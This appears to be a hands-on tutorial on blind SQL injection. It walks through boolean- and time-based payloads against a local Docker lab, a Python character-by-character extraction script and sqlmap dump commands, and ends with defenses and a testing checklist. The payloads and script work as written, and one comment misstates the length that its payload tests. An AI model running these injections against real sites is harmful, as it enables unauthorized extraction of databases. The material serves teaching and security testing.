# Blind SQL Injection — Boolean & Time Based

> **Difficulty:** Medium — **Level:** intermediate

## Introduction

**Blind SQLi** is SQLi where the app does **NOT show data or errors** — no union, no error message. You only get 2 signals: **result / no result** (boolean) or **fast / slow response** (time-based). It sounds harder, but with the right logic you can **still read the entire database**, one character at a time. This is the "advanced level" skill of every web pentester.

---

## Part A — Understand

### What is blind boolean-based?

The app doesn't print data, but returns 2 **different pages** when the condition is true/false:

```
q = x' AND (SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a')-- -
   → first char = 'a'?   True → "found" page, False → "not found" page
```

By asking one letter at a time (`'a'`? `'b'`? `'c'`?...), you **assemble** the password.

> **Analogy:** Like the "20 questions" game — you only hear "yes/no", but ask enough questions and you get the answer. Each character takes ~30 questions (26 letters + 10 digits), instead of guessing an infinitely long string.

### What is blind time-based?

The app always returns the same page regardless of true/false — but you **measure response time**:

```sql
IF (condition TRUE, SLEEP(5), 0)   -- true → wait 5 seconds
```

- True → response takes ~5s
- False → instant response

### SQL functions you need

| Function | Purpose |
|----------|---------|
| `SUBSTRING(str, pos, len)` | Extract a substring |
| `ASCII(char)` | ASCII code of a character |
| `LENGTH(str)` | Length of a string |
| `SLEEP(n)` | Sleep n seconds (MySQL, time-based) |
| `IF(cond, a, b)` | Conditional |
| `BENCHMARK(n, expr)` | Run expr n times (time-based) |

---

## Part B — Exploit: Blind SQLi lab

### Step 1: Start the lab

```bash
cd sqli-blind/lab
docker compose up -d
# Lab at: http://localhost:7105
```

The lab is a user-ID lookup page: `id=1` shows "User exists", `id=999` shows "User not found" — **no data or error leaks**. The DB has a `secret_data` table with one `flag` column.

### Step 2: Confirm blind boolean

```bash
$ curl -s "http://localhost:7105/?id=1' AND 1=1-- -"
User exists

$ curl -s "http://localhost:7105/?id=1' AND 1=2-- -"
User not found
```

<!-- Output already described via CLI commands above -->

> **Explanation:** The "exists/not found" difference is your true/false signal to interrogate the database. This proves blind boolean SQLi.

### Step 3: Measure flag length

Ask `LENGTH`:

```bash
# True if flag length = 30
$ curl -s "http://localhost:7105/?id=1' AND LENGTH((SELECT flag FROM secret_data))=21-- -"
User exists
```

<!-- Output already described via CLI commands above -->

### Step 4: Grab the first character

```bash
# True if first char is 'F'
$ curl -s "http://localhost:7105/?id=1' AND ASCII(SUBSTRING((SELECT flag FROM secret_data),1,1))=70-- -"
User exists
```

> `ASCII('F') = 70`. Try `=65` ('A') → "User not found" → first char isn't A, it's F.

<!-- Output already described via CLI commands above -->

### Step 5: Automate with a Python script

Instead of typing 30 chars × 30 tries manually, write a script:

```python
import requests

url = "http://localhost:7105/"
flag = ""
for i in range(1, 22):           # characters 1..21
    for code in range(32, 127):  # printable ASCII 32..126
        payload = f"1' AND ASCII(SUBSTRING((SELECT flag FROM secret_data),{i},1))={code}-- -"
        r = requests.get(url, params={"id": payload})
        if "User exists" in r.text:
            flag += chr(code)
            print(f"[{i}] {chr(code)}")
            break
print("FLAG:", flag)
```

<!-- Output already described via CLI commands above -->

> **Explanation:** The script asks "does char i have ASCII code = code?" for each code 32–126 until "User exists" → correct. It auto-assembles the whole flag. In CTFs you'll see scripts like this everywhere — this is the essence of "blind".

### Step 6: Time-based (when there's no true/false signal)

```bash
# True → takes 5 seconds, False → instant
$ time curl -s "http://localhost:7105/?id=1' AND IF((SELECT SUBSTRING(flag,1,1) FROM secret_data)='F',SLEEP(5),0)-- -"
real 5.002s   # = first char is 'F'
```

<!-- Output already described via CLI commands above -->

> **Explanation:** `IF(cond true, SLEEP(5), 0)` — if the condition holds, the DB sleeps 5s so the response is 5s late. Measuring `real` in `time` is your true/false signal when the app responds identically.

### Step 7: sqlmap automation (once you understand)

```bash
sqlmap -u "http://localhost:7105/?id=1" --batch --technique=B --dbs
sqlmap -u "http://localhost:7105/?id=1" --batch -D lab_db -T secret_data --dump
```

<!-- Output already described via CLI commands above -->

> ⚠️ `--technique=B` = boolean blind only; `T` = time-based. sqlmap can do it, but **you must be able to write the manual script first** — that's how you tell someone who understands from someone who copies.

---

## Part C — Defend & Checklist

### How to fix

- **Same as normal SQLi:** prepared statements, hide errors, least privilege.
- **Blind-specific:** return the **same response template** for all cases (true/false both say "not found") — but this only reduces impact; the real fix is still parameterized queries.
- **Rate limit** the query endpoint — slow down automated per-character brute force.

### Quick testing checklist

```text
[ ] ' AND 1=1-- -  vs ' AND 1=2-- -  (boolean difference?)
[ ] IF(cond, SLEEP(5), 0)  (time-based, measure with time curl)
[ ] Confirm table/column: AND EXISTS(...)
[ ] Get length: LENGTH(...)  →  get chars: SUBSTRING(...) ASCII(...)
[ ] Write the python script manually first, sqlmap to cross-check
```

---
